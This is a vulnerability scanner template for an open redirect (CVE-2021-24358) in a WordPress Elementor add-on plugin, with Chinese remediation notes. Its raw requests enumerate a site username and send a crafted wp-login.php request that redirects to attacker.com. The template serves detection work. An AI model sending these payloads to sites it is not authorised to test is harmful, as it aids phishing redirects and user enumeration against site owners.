id: CVE-2021-24358
info:
  name: Plus Addons for Elementor Page Builder < 4.1.10 - Open Redirect
  author:
  - l0ne1y
  description: |2+
     WordPress Plugin Plus Addons for Elementorz存在URL重定向漏洞

    WordPress是WordPress（Wordpress）基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    Plus Addons for Elementor Page Builder WordPress plugin 4.1.10之前版本存在安全漏洞，该漏洞源于将用户重定向到一个特定URL之前没有验证一个重定向参数。

  severity: medium
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://wpscan.com/vulnerability/fd4352ad-dae0-4404-94d1-11083cb1f44d

    临时修复方案：
    1、代码固定跳转地址，不让用户控制变量。
    2、跳转目标地址采用白名单映射机制、只对合法的 URL 做跳转。
    3、合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转风险。
requests:
- matchers:
  - type: regex
    part: header
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)attacker\.com\/?(\/|[^.].*)?$
  extractors:
  - name: username
    type: regex
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
    group: 1
    part: body
    internal: true
  - name: username
    type: regex
    regex:
    - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
    group: 1
    part: header
    internal: true
  raw:
  - |
    GET /?author=1 HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}} HTTP/1.1
    Host: {{Hostname}}
  redirects: true
